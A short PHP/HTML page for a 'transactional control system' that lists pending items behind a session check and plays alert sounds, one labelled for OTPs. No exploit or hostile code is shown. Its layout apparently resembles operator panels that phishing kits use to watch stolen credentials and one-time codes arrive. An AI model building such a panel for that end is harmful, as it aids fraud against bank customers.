<?php 
session_start(); 
require('../include/setings.php');
if (!isset($_SESSION["usr-new"])) 
	header("Location: ../");
?>
<head>
	<script type="text/javascript">
		var sitP = 2;
	</script>
	<meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="shortcut icon" href="../assets/img/metronic.ico">
	<title>Sistema De Control Transaccional :: Pendientes</title>
	<link href="../src/css/pluto-fonts.css" rel="stylesheet">
	<link href="../src/css/layout.css" rel="stylesheet">	
	<script type="text/javascript" src="../src/js/jquery-3.6.0.min.js"></script>	
	<script type="text/javascript" src="../src/js/run.js"></script>
</head>
<body bgcolor="#F5F8FA">
	<div class="menu">
		<table class="opciones-mob">
			<tr>
				<td><a href="../dashboard"><img src="../assets/img/todos-g.svg" width="19"></a></td>
				<td><img src="../assets/img/alarma-a.svg" width="19"></td>
				<td><a href="../closed"><img src="../assets/img/final-g.svg" width="19"></a></td>
			</tr>
		</table>
		<div class="opciones"><a href="../dashboard"><span class="item-menu">Todos</span></a> <span class="item-menu" style="background-color:#F4F6FA;color:#5e6278; ">Pendientes</span> <a href="../closed"><span class="item-menu">Finalizados</span></a></div>
		<div class="cerrar"><img src="../assets/img/cerrar-g.svg" width="19"></div>
	</div>
	<div class="items-trans">
		<?php get_items_pending(); ?>		
	</div>
	<audio id="snd">
		<source src="../assets/snd/timbre.mp3" type="audio/mpeg">
	</audio>
	<audio id="sndOTP">
		<source src="../assets/snd/electrico.mp3" type="audio/mpeg">
	</audio>

	<div class="logo">
		<img src="../assets/img/icono.png" width="30" style="margin:20px 0px;">
		<div style="width: 100%; border-bottom: 1px dashed #a58e8e;"></div>
	</div>	
</body>
<script type="text/javascript" src="../src/js/ready.js"></script>